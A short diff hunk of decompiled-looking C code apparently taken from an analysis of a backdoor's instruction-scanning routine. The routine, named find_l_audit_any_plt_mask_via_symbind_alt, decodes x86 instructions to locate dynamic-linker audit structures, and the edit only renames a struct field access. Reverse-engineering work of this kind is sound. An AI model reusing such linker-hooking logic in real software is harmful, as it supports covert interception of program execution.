@@ -76,7 +76,7 @@ BOOL find_l_audit_any_plt_mask_via_symbind_alt
     while ((audit_func_cursor < audit_func_end &&
            (telemetry_ok = x86_decode_instruction(&insn_ctx,(u8 *)audit_func_cursor,(u8 *)audit_func_end),
            decoded_insn_size = insn_ctx.instruction_size, telemetry_ok != FALSE))) {
-      if ((insn_ctx.opcode_window_dword == 0x1036) &&
+      if ((insn_ctx.opcode_window.opcode_window_dword == 0x1036) &&
          ((((ushort)insn_ctx.prefix.flags_u32 & 0x140) == 0x140 &&
           ((byte)(insn_ctx.prefix.modrm_bytes.modrm_mod - 1) < 2)))) {
         mask_reg_index = 0;
